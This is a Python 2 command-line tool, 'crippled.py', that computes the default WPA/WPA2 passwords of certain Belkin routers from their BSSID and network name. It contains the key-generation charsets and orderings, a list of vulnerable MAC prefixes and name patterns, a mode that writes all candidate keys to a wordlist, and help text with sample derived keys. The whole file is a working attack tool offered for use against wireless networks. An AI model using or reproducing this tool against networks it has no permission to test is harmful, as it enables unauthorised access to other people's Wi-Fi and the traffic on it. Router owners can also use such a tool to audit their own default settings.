#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: binary -*-

import re
import sys
import argparse

ORDER_0  = [6,2,3,8,5,1,7,4]
ORDER_1  = [1,2,3,8,5,1,7,4]
ORDER_2  = [1,2,3,8,5,6,7,4]
ORDER_3  = [6,2,3,8,5,6,7,4] # Will be implemented soon.

CHARSET  = '024613578ACE9BDF'
charset  = '944626378ace9bdf'

charsets = [CHARSET,charset]
orders   = [ORDER_0,ORDER_1,ORDER_2]
KEYS     = []

# TO:DO:
# Add support for other WPA/WPA2 Router default key algorithms.

def generateKey(wmac,charset=charset,order=ORDER_0):
    try:
        k = ''.join([wmac[order[i]-1] for i in xrange(len(wmac))])
        return ''.join([charset[int(c,16)] for c in k])
    except IndexError:
        sys.exit("[!] Use real bssids")

def printTargets():
    print "\n[+] Possible vulnerable targets so far:"
    print ""
    for e in essids:
        print "\t essid: {0:s}".format(e)
    print ""
    for t in targets:
        print ("\t bssid: {0:s}:uv:wx:yz ".format(t.upper()))
    print "" # Clean print

def addOneToMac(mac):
    return "%012X" %(int(mac,16)+1)

def printUniqueKeys(output=sys.stdout):
    FILENAME = output.name

    for k in set(KEYS):
        if FILENAME == '<stdout>':
            print '\t' + k

        else:
            output.write(k+"\n")

def bruteforce(mac,output=sys.stdout,wordlist=False):

    for i in xrange(3):
        for c in charsets:
            for o in orders:
                KEYS.append(generateKey(mac[4:], c, o))
        mac = addOneToMac(mac)

    if (wordlist):
        printUniqueKeys(output)
    else:
        printUniqueKeys()

def Help():

    print """
    Basic Usage: ./crippled.py -b 94:44:52:00:C0:DE -e Belkin.c0de

    -h | show this help message and exit

    -w [WORDLIST] | Write outputed keys to file.

    -a | Create all possible key cases.

    -l | List all vulnerable mac address so far.

    Required Options:
    -----------------
    -b [BSSID]

    -e [ESSID]


    # PRACTICAL EXAMPLES #
    ----------------------

    ./crippled.py -l

    [+] Possible vulnerable targets so far:

		essid: Belkin.XXXX
		essid: Belkin_XXXXXX
		essid: belkin.xxxx
		essid: belkin.xxx

		bssid: 94:44:52:uv:wx:yz
		bssid: 08:86:3B:uv:wx:yz
		bssid: EC:1A:59:uv:wx:yz


    ./crippled.py -b 94:44:52:00:C0:DE -e Belkin.c0de

    [+] Your WPA key might be :

	        040D93B0

    ./crippled.py -b 94:44:52:00:ce:d0 -e belkin.ed0

    [+] Your WPA key might be :

	        d49496b9

    ./crippled.py -b 94:44:52:00:ce:d0 -a

    [+] Your WPA keys might be :

        	64949db9
        	D40493B0
        	649996b9
        	649496b9
        	d49496b9
        	34029DB0
        	d49996b9
        	D40293B0
        	64999db9
        	340493B0
        	34009DB0
        	340093B0
        	34049DB0
        	340293B0
        	D40093B0


    ./crippled.py -b 94:44:52:00:ce:d0 -a -w keys.txt

    $ cat keys.txt

	64949db9
	D40493B0
	649996b9
	649496b9
	d49496b9
	34029DB0
	d49996b9
	D40293B0
	64999db9
	340493B0
	34009DB0
	340093B0
	34049DB0
	340293B0
	D40093B0
    """

if __name__ == '__main__':

    global targets
    version     = ' was last updated on [2015-05-12]'
    targets     = ['94:44:52','08:86:3B','EC:1A:59']
    essids      = ['Belkin.XXXX','Belkin_XXXXXX','belkin.xxxx','belkin.xxx']


    parser = argparse.ArgumentParser(add_help=False)

    maingroup = parser.add_argument_group(title='required')
    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Target bssid')
    maingroup.add_argument('-e','--essid', type=str, nargs='?', help='Target essid. [BelkinXXXX,belkin.XXXX]')
    parser.add_argument('-v', action='version', version='%(prog)s'+version)
    parser.add_argument('-w','--wordlist', type=argparse.FileType('w'), nargs='?', help='Filename to store keys',default=sys.stdout)
    parser.add_argument('-h', action='store_true', dest='Help')
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-a','--allkeys', action="store_true",  help='Create all possible key cases.')
    command_group.add_argument('-l','--list', help='List all vulnerable mac address so far', action='store_true')

    args = parser.parse_args()

    if args.Help:
        Help()

    if args.list:
        printTargets()
    else:
        try:
            mac = re.sub(r'[^a-fA-F0-9]', '', args.bssid)
            if (len(mac)!=12):
                sys.exit("[!] Your bssid length looks wrong")
        except Exception:
            exit(0)

        if (args.allkeys):
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '[+] Your WPA keys might be :'
                    bruteforce(mac)
                elif (args.wordlist.name != '<stdout>'):
                    bruteforce(mac, output=args.wordlist, wordlist=True)
            except Exception:
                sys.exit("[!] Check the filename")

        elif (not args.essid):
            sys.exit("[!] Did you forget the -e parameter?")

        elif (args.bssid and args.essid):
            if (args.essid.startswith('B')):   # CHARSET-macwifi
                KEYS.append(generateKey(mac[4:],CHARSET))
            elif (args.essid.startswith('b')): # charset-wanmac
                mac = addOneToMac(mac)

                if (mac.startswith('944452')):
                    KEYS.append(generateKey(mac[4:],charset))
                else:

                    KEYS.append(generateKey(mac[4:],charset))
                    KEYS.append(generateKey(mac[4:],charset,ORDER_2))
                    mac = addOneToMac(mac)
                    KEYS.append(generateKey(mac[4:],charset))
            else:
                sys.exit("[!] Your essid should start with B or b")
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '\n[+] Your WPA/WPA2 key might be :'
                    print " " # Clean print
                    printUniqueKeys()
                    print " " # Clean print
                elif (args.wordlist.name != '<stdout>'):
                    printUniqueKeys(args.wordlist)
            except Exception:
                sys.exit("[!] Forgot the filename?")
        else:
            sys.exit("[!] Check out -h or --help")
